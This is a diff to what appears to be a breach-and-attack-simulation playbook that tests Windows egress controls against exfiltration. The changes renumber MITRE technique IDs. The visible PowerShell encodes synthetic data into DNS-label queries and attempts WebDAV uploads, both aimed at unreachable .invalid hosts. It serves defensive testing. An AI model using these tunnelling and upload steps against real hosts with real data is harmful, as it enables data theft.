@@ -14,10 +14,10 @@ description: >
     3. robocopy Staging          — bulk stage via robocopy (T1074.001)
     4. Archive (Compress-Archive)— zip the staging dir natively (T1560.001)
     5. Archive (external tool)   — 7-Zip / makecab archive if present (T1560.001)
-    6. HTTP(S) Exfil             — POST the archive to an RFC-6761 .invalid host (T1041 / T1048.003)
-    7. DNS Exfil                 — encode a chunk into DNS labels to .invalid (T1048.001)
+    6. HTTP(S) Exfil             — POST the archive to an RFC-6761 .invalid host (T1048.003)
+    7. DNS Exfil                 — encode a chunk into DNS labels to .invalid (T1048.003)
     8. FTP Exfil                 — attempt FTP upload to an unreachable host (T1048.003)
-    9. WebDAV Exfil              — attempt WebClient/net use to a WebDAV target (T1048)
+    9. WebDAV Exfil              — attempt WebClient/net use to a WebDAV target (T1048.003)
     10. Cloud Upload             — resolve/reach public cloud-storage endpoints (T1567.002)
 
   SAFETY: All "sensitive" data is SYNTHETIC decoy content generated at runtime with
@@ -264,9 +264,9 @@ steps:
       Remove-Item (Join-Path $env:TEMP 'bas_exfil_*') -Recurse -Force -ErrorAction SilentlyContinue
 
   # ---------------------------------------------------------------------------
-  # Stage 6 — HTTP(S) Exfiltration (T1041 / T1048.003)
+  # Stage 6 — HTTP(S) Exfiltration (T1048.003)
   # ---------------------------------------------------------------------------
-  - name: "Exfil Stage 6 — HTTP(S) POST Exfiltration to .invalid (T1041 / T1048.003)"
+  - name: "Exfil Stage 6 — HTTP(S) POST Exfiltration to .invalid (T1048.003)"
     technique_id: T1048.003
     framework: custom
     executor: powershell
@@ -309,10 +309,10 @@ steps:
     cleanup: ""
 
   # ---------------------------------------------------------------------------
-  # Stage 7 — DNS Exfiltration (T1048.001)
+  # Stage 7 — DNS Exfiltration (T1048.003)
   # ---------------------------------------------------------------------------
-  - name: "Exfil Stage 7 — DNS Tunneling Exfiltration to .invalid (T1048.001)"
-    technique_id: T1048.001
+  - name: "Exfil Stage 7 — DNS Tunneling Exfiltration to .invalid (T1048.003)"
+    technique_id: T1048.003
     framework: custom
     executor: powershell
     requires_priv: user
@@ -341,7 +341,7 @@ steps:
         $out = & nslookup.exe $q 2>&1 | Out-String
         if ($out -match 'Address:' -and $out -notmatch "can.t find|NXDOMAIN|Non-existent|no response|timed out") { $anyResolved = $true }
       }
-      Write-Output "EXEC T1048.001: encoded synthetic data into DNS labels and issued tunneling queries under $parent. any_resolved=$anyResolved (expected: false). DNS-exfil Stage 7. [BAS-SIM-EXF-S7]"
+      Write-Output "EXEC T1048.003: encoded synthetic data into DNS labels and issued tunneling queries under $parent. any_resolved=$anyResolved (expected: false). DNS-exfil Stage 7. [BAS-SIM-EXF-S7]"
       if ($anyResolved) {
         Write-Output "FAIL: DNS tunneling queries to a .invalid domain resolved — DNS RPZ/firewall is NOT filtering. Real DNS-tunneling exfil would succeed. Deploy DNS RPZ, alert on high-entropy/long-label queries, and block .invalid resolution."
       } else {
@@ -389,10 +389,10 @@ steps:
     cleanup: ""
 
   # ---------------------------------------------------------------------------
-  # Stage 9 — WebDAV Exfiltration (T1048)
+  # Stage 9 — WebDAV Exfiltration (T1048.003)
   # ---------------------------------------------------------------------------
-  - name: "Exfil Stage 9 — WebDAV Exfiltration Attempt (T1048)"
-    technique_id: T1048
+  - name: "Exfil Stage 9 — WebDAV Exfiltration Attempt (T1048.003)"
+    technique_id: T1048.003
     framework: custom
     executor: powershell
     requires_priv: user
@@ -420,7 +420,7 @@ steps:
       } catch {
         if ($_.Exception.Message -match 'status code|remote server returned') { $reached = $true }
       }
-      Write-Output "EXEC T1048: WebDAV PUT attempted to $target (RFC-6761 .invalid). reached=$reached (expected: false). WebDAV-exfil Stage 9. [BAS-SIM-EXF-S9]"
+      Write-Output "EXEC T1048.003: WebDAV PUT attempted to $target (RFC-6761 .invalid). reached=$reached (expected: false). WebDAV-exfil Stage 9. [BAS-SIM-EXF-S9]"
       if ($reached) {
         Write-Output "FAIL: A WebDAV upload reached an outbound web path — WebDAV egress is not filtered. WebDAV blends into normal HTTPS and is a stealthy exfil channel. Restrict the WebClient service and enforce proxy inspection of PUT/PROPFIND."
       } else {
